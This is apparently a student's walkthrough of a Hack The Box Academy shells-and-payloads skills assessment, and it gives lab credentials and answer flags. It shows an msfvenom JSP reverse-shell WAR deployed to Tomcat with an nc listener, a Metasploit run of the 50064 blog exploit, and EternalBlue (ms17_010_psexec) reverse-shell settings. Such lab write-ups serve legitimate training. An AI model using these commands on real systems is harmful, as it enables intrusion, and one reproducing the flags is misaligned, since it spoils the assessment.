Here we are. Itâ€™s the big day and time to start our engagement. We need to put our new skills with crafting and delivering payloads, acquiring and interacting with a shell on Windows and Linux, and how to take over a Web application to the test. Complete the objectives below to finish the engagement.

Scenario:
CAT5's team has secured a foothold into Inlanefrieght's network for us. Our responsibility is to examine the results from the recon that was run, validate any info we deem necessary, research what can be seen, and choose which exploit, payloads, and shells will be used to control the targets. Once on the VPN or from your Pwnbox, we will need to RDP into the foothold host and perform any required actions from there. Below you will find any credentials, IP addresses, and other info that may be required.

Objectives:
Demonstrate your knowledge of exploiting and receiving an interactive shell from a Windows host or server.
Demonstrate your knowledge of exploiting and receiving an interactive shell from a Linux host or server.
Demonstrate your knowledge of exploiting and receiving an interactive shell from a Web application.
Demonstrate your ability to identify the shell environment you have access to as a user on the victim host.
Complete the objectives by answering the challenge questions below.

Credentials and Other Needed Info:
Foothold:

IP:
Credentials: htb-student / HTB_@cademy_stdnt! Can be used by RDP.
Connectivity To The Foothold
Connection Instructions:
Accessing the Skills Assessment lab environment will require the use of XfreeRDP to provide GUI access to the virtual machine. We will be connecting to the Academy lab like normal utilizing your own VM with a HTB Academy VPN key or the Pwnbox built into the module section. You can start the FreeRDP client on the Pwnbox by typing the following into your shell once the target spawns:

Code: bash
xfreerdp /v:<target IP> /u:htb-student /p:HTB_@cademy_stdnt!
You can find the target IP, Username, and Password needed below:

Click below in the Questions section to spawn the target host and obtain an IP address.
IP ==
Username == htb-student
Password == HTB_@cademy_stdnt!


Hosts 1-3 will be your targets for this skills challenge. Each host has a unique vector to attack and may even have more than one route built-in. The challenge questions below can be answered by exploiting these three hosts. Gain access and enumerate these targets. You will need to utilize the Foothold PC provided. The IP will appear when you spawn the targets. Attempting to interact with the targets from anywhere other than the foothold will not work. Keep in mind that the Foothold host has access to the Internal inlanefreight network (172.16.0.0/23 network) so you may want to pay careful attention to the IP address you pick when starting your listeners.


CHALLENGE: RDP to 10.129.204.126 (ACADEMY-SHELLS-SKILLS-FOOTHOLD) with user "htb-student" and password "HTB_@cademy_stdnt!"

Question 1 - What is the hostname of Host-1? (Format: all lower case)
1. xfreerdp /v:10.129.204.126 /u:htb-student /p:HTB_@cademy_stdnt! +clipboard
2. once in i opened a cmd prompt and ran -> nmap -A 172.16.1.0/23 to figure out the host situation & get answer to this question: 
nmap -A 172.16.1.0/23

3. okay so we have 
a. 172.16.1.5 
b. status.inlanefreight.local (172.16.1.11) ->  NetBIOS name: SHELLS-WINSVR
c. blog.inlanefreight.local (172.16.1.12)
d. 172.16.1.13 Computer name: SHELLS-WINBLUE

4. long story short host 1 from the diagram = 172.16.1.11 so the name = shells-winsvr



Question 2 - Exploit the target and gain a shell session. Submit the name of the folder located in C:\Shares\ (Format: all lower case) - dev-share
1. in the RDP session with the jump host, navigate to http://172.16.1.11:8080 using Firefox from within the terminal
2. firefox http://172.16.1.11:8080
3. click on manager app inside of firefox
4. type in credentials tomcat:Tomcatadm (which were provided under "Host-1 hint" in the module's section)
5. from prior experience were gonna need to make a .war file for a rev shell. 
6. lets figure out our interface -> 
ip a | grep "172.16.1.*"
    inet 172.16.1.5/23 brd 172.16.1.255 scope global ens224
7. open new terminal ( still inside RDP'd session ) -> nc -nlvp 4444
8. msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=4444 -f war -o managerUpdated.war
                                                  ^^^^^^^^
*** Remeber to use the IP we just found from the ip a command and not our actual HOST machine IP 
9. lets upload to http://172.16.1.11:8080
10. upload and deploy -> i also hit the extension once it pops up 
11. shell caught. 
12. cd C:\Shares
13. C:\Shares>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2683-3D37

 Directory of C:\Shares

09/22/2021  01:22 PM    <DIR>          .
09/22/2021  01:22 PM    <DIR>          ..
09/22/2021  01:24 PM    <DIR>          dev-share
               0 File(s)              0 bytes
               3 Dir(s)  26,672,443,392 bytes free



Question 3 - What distribution of Linux is running on Host-2? (Format: distro name, all lower case) - ubuntu
1. okay remember in question 1 when i ran nmap on entire network ? this is why. because were going to need to edit /etc/hosts and all the IPs and names associated with them 
2. add following to /etc/hosts: 
172.16.1.11  status.inlanefreight.local
172.16.1.12  blog.inlanefreight.local
10.129.204.126  lab.inlanefreight.local
3. lol jk they are already added.. so i guess i did nmap for practice ANYWAY... 
4. jk jk twice my nmap scan gave us the answer.. 
5. Nmap scan report for blog.inlanefreight.local (172.16.1.12)
Host is up (0.052s latency).

6. final answer: ubuntu 





Question 4 - What language is the shell written in that gets uploaded when using the 50064.rb exploit? - php 
1. searchsploit 50064.rb
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
Lightweight facebook-styled blog 1.3 - Remote | php/webapps/50064.rb
---------------------------------------------- ------------------------
2. final answer: php 


Question 5 - Exploit the blog site and establish a shell session with the target OS. Submit the contents of /customscripts/flag.txt - B1nD_Shells_r_cool 
1. still inside RDP 
2. firefox blog.inlanefreight.local 
3. scroll down to see a post by slade wilson: 
Guys, I think I found a vulnerability in this blog.. Its posted here https://www.exploit-db.com/exploits/50064 does this seem right?
4. under hint 2 we are given the credentials admin:admin123!@#
5. msfconsole -q 
6. use 50064.rb
7. set VHOST blog.inlanefreight.local
set RHOSTS 172.16.1.12
set RHOST 172.16.1.12
set USERNAME admin
set PASSWORD admin123!@#

Question 6 - What is the hostname of Host-3?
1. from diagram we know the IP = 172.16.1.13
2. from OG nmap scan we know host name = SHELLS-WINBLUE 

Question 7 - Exploit and gain a shell session with Host-3. Then submit the contents of C:\Users\Administrator\Desktop\Skills-flag.txt - One-H0st-Down!
1. from name alone i am betting its eternalblue exploit
2. msfconsole -q 
3. use exploit/windows/smb/ms17_010_psexec
4. from running ip a earlier we know the lhost is going to be 172.16.1.5 
5. sf6 exploit(windows/smb/ms17_010_psexec) > set Lhost 172.16.1.5
Lhost => 172.16.1.5
msf6 exploit(windows/smb/ms17_010_psexec) > set LPORT 4445
LPORT => 4445
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOST 172.16.1.13
RHOST => 172.16.1.13

6. run 
7. cat C:/Users/Administrator/Desktop/Skills-flag.txt
